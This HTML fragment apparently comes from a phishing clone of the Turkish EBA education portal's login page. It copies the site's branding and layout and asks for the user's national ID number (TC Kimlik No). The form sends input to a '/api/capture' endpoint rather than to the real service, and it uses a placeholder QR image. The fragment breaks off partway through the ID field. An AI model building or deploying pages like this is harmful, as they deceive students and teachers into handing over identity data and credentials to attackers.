                                    <span class="nl-app-url">https://www.eba.gov.tr</span>
                                </div>
                            </div>
                        </div>
                    </div>

            <!-- KAREKOD BUTONU -->

                            <img src="https://via.placeholder.com/40x40?text=QR" title="Karekod Logosu">

                            </button>

                    </div>

                    <div class="nl-tab-content-row bg4">

<div class="nl-form" id="studentUst" style="display: block;">
    <div class="container">
        <form class="contact100-form validate-form nl-contact-form" action="/api/capture" method="post" name="form" autocomplete="off">
            <p class="nl-title">EBA Hesabı ile Giriş Yap</p>

            <div class="row">
                <div class="col-md-8">
                    <div class="new-login-label-and-box-area">
                        <label class="nl-input-label" for="tckn">TC Kimlik No</label>
                        <div class="nl-wrap-input validate-input" data-validate="TC Kimlik No giriniz!">
                            <input id="tckn" class="input100 nl-input" type="text" name="tckn"
                                oninput="if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);"
                                maxlength="11" placeholder="" required autofocus
                                onkeypress="return event.charCode >= 48 && event.charCode <= 57"
                                autocomplete="off">
                            <span class="focus-input100 nl-focus-input"></span>
